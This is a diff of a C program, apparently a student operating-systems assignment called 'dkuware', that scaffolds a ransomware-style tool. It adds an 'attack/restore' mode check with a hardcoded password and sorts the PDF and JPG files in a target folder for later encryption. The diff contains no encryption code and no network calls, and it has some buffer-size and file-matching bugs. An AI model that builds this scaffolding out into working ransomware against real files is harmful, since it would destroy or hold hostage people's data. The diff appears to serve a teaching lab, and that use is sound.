@@ -19,13 +19,21 @@
 
 // =========== handles file directory ===========
 // For counting file count to be saved in directory string array
-static int fileCount = 0;
-// Array of files from ./oshw2_sample/dkuware/target
-char directory[MAX_FILE_AMOUNT][DIR_LENGTH] = {
+static int pdfFileCount = 0;
+char pdfList[MAX_FILE_AMOUNT][DIR_LENGTH] = {
     {
         0,
     },
 };
+
+static int jpgFileCount = 0;
+char jpgList[MAX_FILE_AMOUNT][DIR_LENGTH] = {
+    {
+        0,
+    },
+};
+
+int inputValidate(int argc, char *argv[]);
 
 void readFileList();
 
@@ -42,38 +50,101 @@ void *decryption_pdfs(void *param);
 void *decryption_jpgs(void *param);
 
 int main(int argc, char *argv[]) {
+  if (!inputValidate(argc, argv)) {
+    return -1;
+  }
+
   readFileList();  // read all files in target directory and save their
                    // name into "directory" string array
 
-  printf("%d\n", fileCount);
+  // debug
+  printf("pdfs: %d, jpgs: %d\n", pdfFileCount, jpgFileCount);
 
-  for (int i = 0; i < fileCount; i++) {
-    printf("%s\n", directory[i]);
+  // debug
+  printf("=== pdfFile ===\n");
+  for (int i = 0; i < pdfFileCount; i++) {
+    printf("%s\n", pdfList[i]);
   }
+
+  // debug
+  printf("=== jpgFile ===\n");
+  for (int i = 0; i < jpgFileCount; i++) {
+    printf("%s\n", jpgList[i]);
+  }
+
+  // read a single jpg file by 16 bytes
 
   return 0;
 }
 
+int inputValidate(int argc, char *argv[]) {
+  if (argc != 3) {
+    printf("Error: Invalid Input\n");
+    printf("Input example: <./filename> <attack/restore> <password>\n");
+    return 0;
+  }
+
+  if (strcmp(argv[1], "attack") && strcmp(argv[1], "restore")) {
+    printf("Error: Invalid Input\n");
+    printf("Input example: <./filename> <attack/restore> <password>\n");
+    return 0;
+  }
+
+  if (strcmp(argv[2], "password")) {
+    printf("Error: Inputted password is not correct.\n");
+    return 0;
+  }
+
+  return 1;
+}
+
 void readFileList() {
   char command[BUF_SIZE] = "ls ./target";
-
-  char directoryItem[DIR_LENGTH] = {
+  char fileItem[DIR_LENGTH] = {
       0,
   };
 
+  char *fileTypeLower;  // .pdf, .jpg
+  char *fileTypeUpper;  // .PDF, .JPG
+
   FILE *pipe = popen(command, "r");
+
   if (!pipe) {
     perror("Command execution error");
     return;
   } else {
-    while (fscanf(pipe, "%s", directoryItem) > 0) {
+    while (fscanf(pipe, "%s", fileItem) > 0) {
       // when fileCount exceeds maximum index of directoryItem array, then
       // escape the loop statement.
-      if (fileCount >= MAX_FILE_AMOUNT) {
+      if (pdfFileCount >= MAX_FILE_AMOUNT || jpgFileCount >= MAX_FILE_AMOUNT) {
         break;
       }
-      strcpy(directory[fileCount++], directoryItem);
-      memset(directoryItem, 0, BUF_SIZE);
+
+      fileTypeLower = strstr(fileItem, ".pdf\0");
+      if (fileTypeLower != NULL) {
+        strcpy(pdfList[pdfFileCount++], fileItem);
+        memset(fileItem, 0, BUF_SIZE);
+        continue;
+      }
+
+      fileTypeUpper = strstr(fileItem, ".PDF\0");
+      if (fileTypeUpper != NULL) {
+        strcpy(pdfList[pdfFileCount++], fileItem);
+        memset(fileItem, 0, BUF_SIZE);
+        continue;
+      }
+
+      fileTypeLower = strstr(fileItem, ".jpg\0");
+      if (fileTypeLower != NULL) {
+        strcpy(jpgList[jpgFileCount++], fileItem);
+      }
+
+      fileTypeUpper = strstr(fileItem, ".JPG\0");
+      if (fileTypeUpper != NULL) {
+        strcpy(jpgList[jpgFileCount++], fileItem);
+      }
+
+      memset(fileItem, 0, BUF_SIZE);
     }
   }
 
